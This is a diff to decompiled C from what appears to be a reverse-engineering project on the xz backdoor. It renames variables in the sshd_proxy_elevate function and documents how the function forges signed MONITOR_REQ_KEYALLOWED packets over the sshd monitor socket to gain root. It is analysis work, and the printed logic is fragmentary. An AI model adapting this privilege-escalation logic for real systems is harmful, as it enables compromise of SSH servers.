@@ -5,7 +5,14 @@
 
 
 /*
- * AutoDoc: Crafts and transmits a forged MONITOR_REQ_KEYALLOWED packet through the monitor socket to obtain root privileges in sandboxed sshd instances. It’s invoked by run_backdoor_commands when the current context lacks the ability to execute the payload directly.
+ * AutoDoc: Implements the privileged side of the monitor command channel. Depending on the cmd_type and
+ * flags it may disable PAM, short-circuit non interactive requests, or exit when instructed. For
+ * KEYALLOWED-style payloads it hunts for the staged ChaCha-wrapped blob on the stack, decrypts
+ * it with the recovered key, generates a signed MONITOR_REQ_KEYALLOWED packet using freshly
+ * built RSA/BIGNUM objects and the attacker-provided modulus/exponent, and writes the forged
+ * request over the selected monitor or fallback socket. It then pushes any extra sshbuf data
+ * when needed, drains the reply, and honours 'exit' or 'wait for response' semantics encoded in
+ * the original command.
  */
 #include "xzre_types.h"
 
@@ -47,7 +54,7 @@ BOOL sshd_proxy_elevate(monitor_data_t *args,global_context_t *ctx)
   sshbuf *psVar25;
   uint *puVar26;
   undefined4 *puVar27;
-  undefined1 *puVar28;
+  uchar *puVar28;
   uint *puVar29;
   size_t *psVar30;
   u8 *puVar31;
@@ -56,8 +63,11 @@ BOOL sshd_proxy_elevate(monitor_data_t *args,global_context_t *ctx)
   long *addr;
   long lVar34;
   byte bVar35;
+  u8 monitor_request [1800];
+  cmd_arguments_t *cmd_flags;
+  RSA *rsa_tmp;
   uchar local_e81;
-  int local_e80;
+  int monitor_fd;
   uint local_e7c;
   u64 local_e78;
   BIGNUM *local_e70 [2];
@@ -73,20 +83,7 @@ BOOL sshd_proxy_elevate(monitor_data_t *args,global_context_t *ctx)
   uint local_b20 [2];
   undefined1 uStack_b18;
   undefined7 uStack_b17;
-  undefined1 local_b10;
-  uint uStack_b0f;
-  undefined4 uStack_b0b;
-  undefined7 uStack_b07;
-  undefined1 uStack_b00;
-  undefined4 uStack_aff;
-  undefined4 uStack_afb;
-  undefined4 uStack_af7;
-  undefined8 uStack_af3;
-  undefined4 local_aeb;
-  undefined4 local_ac7;
-  undefined1 local_ac3;
-  undefined1 local_ac1;
-  undefined4 local_ac0;
+  uchar payload_hash [32];
   undefined4 local_abb [66];
   undefined4 local_9b3;
   uint local_98b;
@@ -108,7 +105,7 @@ BOOL sshd_proxy_elevate(monitor_data_t *args,global_context_t *ctx)
     *puVar26 = 0;
     puVar26 = puVar26 + 1;
   }
-  local_e80 = -1;
+  monitor_fd = -1;
   if (args == (monitor_data_t *)0x0) {
     return 0;
   }
@@ -235,10 +232,22 @@ LAB_0010845f:
               local_b20[1] = 0;
               uStack_b18 = 0;
               uStack_b17 = 0;
-              local_b10 = 0;
-              uStack_b0f = 0;
-              uStack_b0b = 0;
-              uStack_b07 = 0;
+              payload_hash[0] = '\0';
+              payload_hash[1] = '\0';
+              payload_hash[2] = '\0';
+              payload_hash[3] = '\0';
+              payload_hash[4] = '\0';
+              payload_hash[5] = '\0';
+              payload_hash[6] = '\0';
+              payload_hash[7] = '\0';
+              payload_hash[8] = '\0';
+              payload_hash[9] = '\0';
+              payload_hash[10] = '\0';
+              payload_hash[0xb] = '\0';
+              payload_hash[0xc] = '\0';
+              payload_hash[0xd] = '\0';
+              payload_hash[0xe] = '\0';
+              payload_hash[0xf] = '\0';
               if ((*addr == lVar19) &&
                  (BVar10 = sha256(addr,sVar20,(u8 *)local_b20,0x20,ctx->imported_funcs), BVar10 != 0
                  )) {
@@ -253,9 +262,9 @@ LAB_0010845f:
                     local_b20[1] = 0;
                     uStack_b18 = 0;
                     uStack_b17 = 0;
-                    puVar28 = &local_b10;
+                    puVar28 = payload_hash;
                     for (lVar19 = 0x29; lVar19 != 0; lVar19 = lVar19 + -1) {
-                      *puVar28 = 0;
+                      *puVar28 = '\0';
                       puVar28 = puVar28 + (ulong)bVar35 * -2 + 1;
                     }
                     BVar10 = secret_data_get_decrypted((u8 *)local_b20,ctx);
@@ -351,23 +360,21 @@ LAB_0010845f:
       *puVar23 = 0;
       puVar23 = puVar23 + (ulong)bVar35 * -2 + 1;
     }
-    uStack_b0b = 0x1c000000;
+    payload_hash[5] = '\0';
+    payload_hash[6] = '\0';
+    payload_hash[7] = '\0';
+    payload_hash[8] = '\x1c';
     local_e70[0] = pBVar18;
     local_e40 = CONCAT71(local_e40._1_7_,0x80);
     local_e70[1] = pBVar17;
-    uStack_b07 = (undefined7)*(undefined8 *)pcVar32;
-    uStack_b00 = (undefined1)((ulong)*(undefined8 *)pcVar32 >> 0x38);
-    uStack_aff = (undefined4)*(undefined8 *)(pcVar32 + 8);
-    local_aeb = 0x20000000;
+    payload_hash._9_7_ = (undefined7)*(undefined8 *)pcVar32;
+    payload_hash[0x10] = (uchar)((ulong)*(undefined8 *)pcVar32 >> 0x38);
+    payload_hash._17_4_ = (undefined4)*(undefined8 *)(pcVar32 + 8);
     local_d4a = 8;
     local_d41 = 1;
-    local_ac7 = 0x3000000;
-    local_ac3 = 1;
-    local_ac1 = 1;
-    local_ac0 = 0x1010000;
-    uStack_afb = (undefined4)*(undefined8 *)(pcVar32 + 0xc);
-    uStack_af7 = (undefined4)((ulong)*(undefined8 *)(pcVar32 + 0xc) >> 0x20);
-    uStack_af3 = *(undefined8 *)(pcVar32 + 0x14);
+    payload_hash._21_4_ = (undefined4)*(undefined8 *)(pcVar32 + 0xc);
+    payload_hash._25_4_ = (undefined4)((ulong)*(undefined8 *)(pcVar32 + 0xc) >> 0x20);
+    stack0xfffffffffffff50d = *(undefined8 *)(pcVar32 + 0x14);
     puVar22 = &local_e40;
     puVar27 = local_abb;
     for (lVar19 = 0x40; lVar19 != 0; lVar19 = lVar19 + -1) {
@@ -396,8 +403,9 @@ LAB_0010845f:
         local_98b = uVar11 >> 0x18 | (uVar11 & 0xff0000) >> 8 | (uVar11 & 0xff00) << 8 |
                     uVar11 * 0x1000000;
         uVar11 = iVar12 + 0x2a7;
-        uStack_b0f = uVar11 >> 0x18 | (uVar11 & 0xff0000) >> 8 | (uVar11 & 0xff00) << 8 |
-                     uVar11 * 0x1000000;
+        payload_hash._1_4_ =
+             uVar11 >> 0x18 | (uVar11 & 0xff0000) >> 8 | (uVar11 & 0xff00) << 8 | uVar11 * 0x1000000
+        ;
         uVar11 = iVar12 + 700;
         local_b20[0] = uVar11 >> 0x18 | (uVar11 & 0xff0000) >> 8 | (uVar11 & 0xff00) << 8 |
                        uVar11 * 0x1000000;
@@ -454,7 +462,7 @@ LAB_00108861:
                 return 0;
               }
               if ((pcVar13->flags1 & 0x20) == 0) {
-                iVar12 = sshd_get_client_socket(ctx,&local_e80,1,DIR_WRITE);
+                iVar12 = sshd_get_client_socket(ctx,&monitor_fd,1,DIR_WRITE);
               }
               else {
                 if (uVar11 == 2) {
@@ -475,9 +483,9 @@ LAB_001088b7:
                     socket_index = pcVar13->flags3 & 0x1f;
                   }
                 }
-                iVar12 = sshd_get_usable_socket(&local_e80,socket_index,ctx->libc_imports);
+                iVar12 = sshd_get_usable_socket(&monitor_fd,socket_index,ctx->libc_imports);
               }
-              fd = local_e80;
+              fd = monitor_fd;
               if (iVar12 == 0) {
                 return 0;
               }
@@ -489,7 +497,7 @@ LAB_001088b7:
                 *(undefined4 *)&psVar25->d = 0;
                 psVar25 = (sshbuf *)((long)psVar25 + (ulong)bVar35 * -8 + 4);
               }
-              if (local_e80 < 0) {
+              if (monitor_fd < 0) {
                 return 0;
               }
               if (pcVar13 == (cmd_arguments_t *)0x0) {
